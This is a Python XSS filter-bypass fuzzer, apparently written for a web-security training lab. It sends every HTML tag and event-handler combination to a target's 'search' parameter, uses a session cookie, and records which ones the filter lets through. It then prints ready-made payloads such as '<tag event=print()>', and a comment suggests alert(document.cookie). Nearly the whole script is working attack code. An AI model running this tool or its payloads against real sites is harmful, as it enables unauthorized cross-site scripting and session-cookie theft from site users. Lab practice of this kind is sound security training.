import requests
import time

# ===================== SETTINGS =====================
URL = ""                           #TYPE YOUR URL HERE
SESSION = ""           #TYPE YOUR SESSION(cookie) HERE

REQUESTS_PER_SECOND = 5
# ====================================================

DELAY = 1 / REQUESTS_PER_SECOND

TAGS = [
    "a", "abbr", "acronym", "address", "animate", "animatemotion",
    "animatetransform", "article", "aside", "audio", "b", "bdi", "bdo",
    "big", "blockquote", "body", "br", "button", "canvas", "caption",
    "center", "cite", "code", "col", "colgroup", "command", "content",
    "custom tags", "data", "datalist", "dd", "del", "details", "dfn",
    "dialog", "dir", "div", "dl", "dt", "element", "em", "fieldset",
    "figcaption", "figure", "font", "footer", "form", "h1", "h2", "h3",
    "h4", "h5", "h6", "head", "header", "hgroup", "hr", "html", "i",
    "iframe", "image", "img", "input", "ins", "kbd", "label", "legend",
    "li", "link", "listing", "main", "map", "mark", "marquee", "menu",
    "menuitem", "meta", "meter", "nav", "nobr", "noembed", "noframes",
    "noscript", "object", "ol", "optgroup", "option", "output", "p",
    "param", "picture", "plaintext", "portal", "pre", "progress", "q",
    "rp", "rt", "ruby", "s", "samp", "script", "section", "select",
    "set", "shadow", "slot", "small", "source", "span", "strike",
    "strong", "style", "sub", "summary", "sup", "svg", "table", "tbody",
    "td", "template", "textarea", "tfoot", "th", "thead", "time",
    "title", "tr", "track", "tt", "u", "ul", "use", "var", "video",
    "wbr", "xmp"
]

EVENTS = [
    "onactivate", "onafterprint", "onafterscriptexecute", "onanimationend",
    "onanimationiteration", "onanimationstart", "onauxclick", "onbeforecopy",
    "onbeforecut", "onbeforeinput", "onbeforeprint", "onbeforescriptexecute",
    "onbeforetoggle", "onbeforeunload", "onbegin", "onblur", "onbounce",
    "oncanplay", "oncanplaythrough", "onchange", "onclick", "onclose",
    "oncontentvisibilityautostatechange", "oncontextmenu", "oncopy", "oncuechange",
    "oncut", "ondblclick", "ondrag", "ondragend", "ondragenter", "ondragleave",
    "ondragover", "ondragstart", "ondrop", "ondurationchange", "onend",
    "onended", "onerror", "onfinish", "onfocus", "onfocusin", "onfocusout",
    "onfullscreenchange", "onhashchange", "oninput", "oninvalid", "onkeydown",
    "onkeypress", "onkeyup", "onload", "onloadeddata", "onloadedmetadata",
    "onloadstart", "onmessage", "onmousedown", "onmouseenter", "onmouseleave",
    "onmousemove", "onmouseout", "onmouseover", "onmouseup", "onmousewheel",
    "onmozfullscreenchange", "onpagehide", "onpageshow", "onpaste", "onpause",
    "onplay", "onplaying", "onpointercancel", "onpointerdown", "onpointerenter",
    "onpointerleave", "onpointermove", "onpointerout", "onpointerover",
    "onpointerrawupdate", "onpointerup", "onpopstate", "onprogress",
    "onratechange", "onrepeat", "onreset", "onresize", "onscroll",
    "onscrollend", "onsearch", "onseeked", "onseeking", "onselect",
    "onselectionchange", "onselectstart", "onshow", "onstart", "onstorage",
    "onsubmit", "onsuspend", "ontimeupdate", "ontoggle", "ontouchend",
    "ontouchmove", "ontouchstart", "ontransitioncancel", "ontransitionend",
    "ontransitionrun", "ontransitionstart", "onunload", "onvolumechange",
    "onwaiting", "onwebkitanimationend", "onwebkitanimationiteration",
    "onwebkitanimationstart", "onwebkittransitionend", "onwheel"
]

cookies = {"session": SESSION}

print("=" * 50)
print("PHASE 1: Scanning allowed tags...")
print("=" * 50)

allowed_tags = []
for tag in TAGS:
    payload = f"<{tag}>"
    params = {"search": payload}
    response = requests.get(URL, params=params, cookies=cookies, timeout=10)
    time.sleep(DELAY)
    if tag in response.text:
        allowed_tags.append(tag)
        print(f"✓ ALLOWED: <{tag}>")

print(f"\nAllowed tags: {allowed_tags}\n")

print("=" * 50)
print("PHASE 2: Scanning allowed events...")
print("=" * 50)

allowed_events = []
for tag in allowed_tags:
    for event in EVENTS:
        payload = f"<{tag} {event}=1>"
        params = {"search": payload}
        response = requests.get(URL, params=params, cookies=cookies, timeout=10)
        time.sleep(DELAY)
        if event in response.text:
            allowed_events.append((tag, event))
            print(f"✓ ALLOWED: <{tag} {event}>")

print(f"\nAllowed tag+event combos: {allowed_events}")
print("\nSuggested payload:")
for tag, event in allowed_events:
    print(f"  <{tag} {event}=print()>")# Note: replace print() with alert() or alert(document.cookie) depending on the lab